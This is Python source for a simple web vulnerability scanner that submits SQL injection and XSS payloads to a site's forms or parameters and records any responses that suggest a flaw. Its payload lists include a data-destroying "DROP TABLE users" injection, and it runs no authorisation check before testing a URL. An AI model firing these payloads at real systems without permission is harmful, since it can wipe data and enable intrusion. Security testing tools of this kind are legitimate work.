#scanner.py

import requests
import sys
import json
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Payloads
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\" onerror=\"alert(1)", "'><img src=x onerror=alert(1)>"]

# Results
results = []

def get_risk_level(payload, vuln_type):
    if vuln_type == "SQL Injection":
        if "DROP" in payload or "--" in payload:
            return "High"
        elif "OR" in payload:
            return "Medium"
        else:
            return "Low"
    elif vuln_type.startswith("XSS"):
        if "<script>" in payload:
            return "High"
        elif "onerror" in payload:
            return "Medium"
        else:
            return "Low"
    return "Low"

def analyze_response_for_xss(response_text, payload):
    if payload in response_text:
        if "<script>" in payload:
            return "High"
        elif "onerror" in payload:
            return "Medium"
        else:
            return "Low"
    return None

def record_result(url, param, method, vuln_type, payload, risk):
    results.append({
        "url": url,
        "parameter": param,
        "method": method,
        "vulnerability": vuln_type,
        "payload": payload,
        "risk": risk
    })

def test_sqli_get(url, param_name):
    print("\n[+] Testing SQL Injection via GET...")
    for payload in SQLI_PAYLOADS:
        params = {param_name: payload}
        try:
            response = requests.get(url, params=params)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                risk = get_risk_level(payload, "SQL Injection")
                print(f"{Fore.RED}[!] Possible SQL Injection detected (GET) with payload: {payload} [Risk: {risk}]")
                record_result(url, param_name, "GET", "SQL Injection", payload, risk)
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Error during GET SQLi: {e}")

def test_sqli_post(url, param_name):
    print("\n[+] Testing SQL Injection via POST...")
    for payload in SQLI_PAYLOADS:
        data = {param_name: payload}
        try:
            response = requests.post(url, data=data)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                risk = get_risk_level(payload, "SQL Injection")
                print(f"{Fore.RED}[!] Possible SQL Injection detected (POST) with payload: {payload} [Risk: {risk}]")
                record_result(url, param_name, "POST", "SQL Injection", payload, risk)
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Error during POST SQLi: {e}")

def test_xss_get(url, param_name):
    print("\n[+] Testing XSS via GET (Reflected only)...")
    for payload in XSS_PAYLOADS:
        params = {param_name: payload}
        try:
            response = requests.get(url, params=params)
            risk = analyze_response_for_xss(response.text, payload)
            if risk:
                print(f"{Fore.YELLOW}[!] Reflected XSS (GET) with payload: {payload} [Risk: {risk}]")
                record_result(url, param_name, "GET", "XSS - Reflected", payload, risk)
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Error during GET XSS: {e}")

def test_xss_post(url, param_name, revisit_url=None):
    print("\n[+] Testing XSS via POST (Reflected + Stored)...")
    for payload in XSS_PAYLOADS:
        data = {param_name: payload}
        try:
            response = requests.post(url, data=data)

            # Reflected check
            risk = analyze_response_for_xss(response.text, payload)
            if risk:
                print(f"{Fore.YELLOW}[!] Reflected XSS (POST) with payload: {payload} [Risk: {risk}]")
                record_result(url, param_name, "POST", "XSS - Reflected", payload, risk)

            # Stored check (revisit same page)
            if revisit_url:
                followup = requests.get(revisit_url)
                if payload in followup.text:
                    print(f"{Fore.MAGENTA}[!] Stored XSS Detected after revisiting: {revisit_url}")
                    record_result(revisit_url, param_name, "GET", "XSS - Stored", payload, "High")

        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Error during POST XSS: {e}")

def get_forms(url):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"{Fore.RED}[-] Error fetching forms: {e}")
        return []

def extract_form_details(form, base_url):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = form.find_all("input")
    
    data = {}
    for input_tag in inputs:
        name = input_tag.get("name")
        if name:
            data[name] = "test"

    target_url = base_url if not action or action == "#" else urljoin(base_url, action)
    return target_url, method, data

def scan_forms(url):
    print(f"{Fore.CYAN}[~] Searching for forms in: {url}")
    forms = get_forms(url)
    if not forms:
        print(f"{Fore.RED}[-] No forms found.")
        return

    for i, form in enumerate(forms):
        print(f"\n{Fore.CYAN}[+] Found form #{i + 1}")
        action_url, method, form_data = extract_form_details(form, url)
        print(f"{Fore.CYAN}    Action: {action_url}, Method: {method.upper()}, Fields: {list(form_data.keys())}")

        for param in form_data:
            if method == "post":
                test_sqli_post(action_url, param)
                test_xss_post(action_url, param, revisit_url=url)
            else:
                test_sqli_get(action_url, param)
                test_xss_get(action_url, param)

def save_report():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"report_{timestamp}.json"
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    print(f"\n{Fore.GREEN}[✔] Scan completed. Report saved to {filename}")

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python scanner.py <url>                     (auto scan forms)")
        print("  python scanner.py <url> <param> <GET|POST>  (manual param scan)")
        sys.exit(1)

    url = sys.argv[1]

    if len(sys.argv) == 2:
        scan_forms(url)
    else:
        param = sys.argv[2]
        method = sys.argv[3].upper()
        print(f"{Fore.CYAN}[~] Scanning target: {url} using method: {method} and parameter: {param}")
        if method == "GET":
            test_sqli_get(url, param)
            test_xss_get(url, param)
        elif method == "POST":
            test_sqli_post(url, param)
            test_xss_post(url, param, revisit_url=url)
        else:
            print(f"{Fore.RED}[-] Invalid method. Use GET or POST.")

    save_report()

if __name__ == "__main__":
    main()
